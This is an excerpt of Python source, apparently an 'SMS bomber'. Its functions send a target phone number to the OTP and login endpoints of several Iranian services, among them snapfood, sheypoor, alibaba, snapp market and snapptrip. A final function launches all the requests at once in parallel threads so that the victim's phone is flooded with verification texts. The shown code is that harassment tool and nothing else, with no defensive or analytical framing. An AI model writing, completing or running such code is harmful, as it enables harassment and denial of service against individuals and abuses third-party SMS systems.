...
def echarge(phone):
    ...
    http.request("post", "https://www.echarge.ir/m/login?length=19",
            ...
            body=dumps({"phoneNumber": f'0{phone.split("+98")[1]}'}).encode())
...
def snapfood(phone):
    ...
    sfoodR = requests.post('https://snapfood.ir/customer/app-dl/send', headers=sfoodH, data=sfoodD )
    print("snapfood")   
def sheypoor(phone):
    #sheypor api
    ...
    sheyporR = requests.post('https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD )
    print("sheypoor")   
def alibaba(phone):
    #alibaba hotel api
    ...
    alibabaR = requests.post('https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD )
    print("alibaba")       
def smarket(phone):
    #snapp market api
    ...
    smarketR = requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={smarketD}', headers=smarketH )
    print("smarket")    
def arka(phone):
    #arka api
    ...
    arkaR = requests.post('https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD )
    print("arka")
def sTrip(phone):
    ...
    sTripR = requests.post('https://www.snapptrip.com/register', headers=sTripH, json=sTripD)
    print("sTrip")
...
def ther(phone):
    ...
    Thread(target=echarge, args=[phone]).start()
    ...
    Thread(target=arka, args=[phone]).start()
